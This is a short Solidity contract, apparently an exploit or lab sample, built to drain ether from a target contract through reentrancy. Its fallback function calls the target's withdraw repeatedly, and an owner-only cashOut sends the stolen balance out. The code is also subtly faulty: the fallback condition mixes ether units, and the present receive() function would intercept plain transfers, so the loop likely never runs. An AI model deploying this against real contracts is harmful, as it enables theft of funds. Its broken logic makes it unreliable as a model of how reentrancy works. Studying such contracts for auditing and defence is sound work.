//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.1;

interface attackerInterface {
    function withdraw(uint256 _amount) external;
}

contract AttackerInteraction {
    address counterAddr;
    address payable _owner;

    constructor() {
        _owner = payable(msg.sender);
    }

    function setCounterAddr(address _counter) public payable {
        counterAddr = _counter;
    }

    function AtackLaunch(uint256 _amount) external payable {
        attackerInterface(counterAddr).withdraw(_amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        if ((address(counterAddr).balance / 1 ether) >= 0.001 ether) {
            attackerInterface(counterAddr).withdraw(1000000000000000);
        }
    }

    receive() external payable {
        // custom function code
    }

    function cashOut(address payable _addr) external payable {
        require(msg.sender == _owner);
        _addr.transfer(address(this).balance);
    }
}
